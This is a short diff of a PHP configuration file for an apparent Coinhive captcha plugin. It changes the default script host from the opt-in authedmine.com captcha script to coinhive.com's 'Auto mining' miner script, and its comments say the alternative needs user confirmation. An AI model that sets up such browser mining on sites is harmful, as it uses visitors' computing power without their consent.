@@ -20,10 +20,10 @@ $ch_public_key = ''; // Your site public key
 $ch_secret_key = ''; // Your site secret key
 $ch_hasehs = 1024; // How many hashes allow users passed captcha? Min:256
 
-$ch_host = 'https://authedmine.com/lib/captcha.min.js';
+$ch_host = 'https://coinhive.com/lib/coinhive.min.js';
 // There have 2 host you can choose
-// https://authedmine.com/lib/captcha.min.js (AdBlock Friendly)
-// https://coinhive.com/lib/captcha.min.js (Auto verify and mining in background support)
+// https://authedmine.com/lib/coinhive.min.js (AdBlock Friendly, But need user confirm)
+// https://coinhive.com/lib/coinhive.min.js (Auto mining)
 
 //$ch_enable_background_mining = true;
 // Background mining need set $ch_host to https://authedmine.com/lib/captcha.min.js
